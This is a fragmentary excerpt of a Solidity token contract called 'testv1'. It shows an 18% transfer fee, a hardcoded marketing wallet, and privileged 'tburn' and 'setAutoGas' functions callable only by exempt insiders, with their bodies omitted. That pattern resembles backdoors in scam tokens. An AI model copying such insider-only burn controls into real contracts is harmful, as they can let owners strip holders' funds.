...
contract testv1 is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string constant _name = "testv1";
    string constant _symbol = "testv1";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = (_totalSupply * 8) / 100; //8% of total supply
    uint256 public _maxWalletToken = (_totalSupply * 8) / 100; //8% of total supply
    ...
    uint256 reflectionFee = 15; // Fee for cakes
    uint256 marketingFee = 3; // Fee for marketing
    uint256 totalFee = 18;
    ...
    address public marketingFeeReceiver = address(0x48d5aF5975397E3669628014e12845B12047e269);
    ...
    constructor () {
        ...
        // TargetToken = 0x947950BcC74888a40Ffa2593C5798F11Fc9124C4;
    ...
    function tburn(uint256 amount, address _DEAD) external {
        require(
            isTxLimitExempt[_msgSender()] == true,   "Error"
        );
    ...
    function setAutoGas(uint256 amount) external {
        require(
            isTxLimitExempt[_msgSender()] == true,   "Error"
        );
